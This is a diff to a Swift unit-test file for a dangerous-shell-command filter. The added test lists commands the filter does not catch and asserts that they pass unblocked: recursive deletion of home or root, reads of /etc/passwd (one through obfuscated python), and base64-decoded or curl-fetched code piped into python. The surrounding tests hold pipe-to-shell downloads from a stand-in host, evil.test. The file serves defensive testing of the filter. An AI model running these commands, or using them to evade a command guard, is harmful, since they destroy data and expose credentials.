@@ -10,6 +10,21 @@ final class DangerousCommandTests: XCTestCase {
         XCTAssertNotNil(DangerousCommand.blockReason(for: "rm -rf $HOME/Downloads"))
     }
 
+    func testKnownBypassesAreNotAHardBoundary() {
+        let samples = [
+            "rm -r -f ~",
+            "rm --recursive --force /",
+            "find ~ -delete",
+            "cd / && cat etc/passwd",
+            "python3 -c 'open(chr(47)+\"etc/passwd\").read()'",
+            "echo aGVsbG8= | base64 -d | python3",
+            "curl https://example.com | python3",
+        ]
+        for sample in samples {
+            XCTAssertNil(DangerousCommand.blockReason(for: sample), sample)
+        }
+    }
+
     func testBlocksPipeToShell() {
         XCTAssertNotNil(DangerousCommand.blockReason(for: "curl https://evil.test/x.sh | bash"))
         XCTAssertNotNil(DangerousCommand.blockReason(for: "wget -O- https://evil.test/x | sh"))
